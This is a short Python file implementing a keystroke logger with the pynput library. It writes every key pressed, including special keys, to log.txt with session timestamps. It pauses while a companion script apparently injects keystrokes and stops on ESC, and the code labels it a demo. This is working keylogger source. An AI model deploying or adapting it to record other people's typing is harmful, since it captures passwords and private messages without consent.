from pynput import keyboard
import datetime
import os

# shared flag that port.py will modify
typing_active = False

class KeystrokeMonitor:
    def __init__(self, log_file="log.txt"):
        self.log_file = log_file
        self.keys = []

        # Write header to log file
        with open(self.log_file, 'a') as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Session started: {datetime.datetime.now()}\n")
            f.write(f"{'='*50}\n")

    def on_press(self, key):

        # skip logging if port.py is injecting keystrokes
        if typing_active:
            return

        try:
            char = key.char
            self.keys.append(char)
            self.write_to_file(char)
        except AttributeError:
            special_key = f'[{key.name}]'
            self.keys.append(special_key)
            self.write_to_file(special_key)

    def write_to_file(self, key_data): 
        with open(self.log_file, 'a') as f:
            f.write(key_data)

    def on_release(self, key):
        if key == keyboard.Key.esc:
            print("\n\n[DEMO STOPPED] ESC key pressed")
            return False

    def start(self):
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release) as listener:
            listener.join()

def main():
    monitor = KeystrokeMonitor()
    monitor.start()


if __name__ == "__main__":
    main()
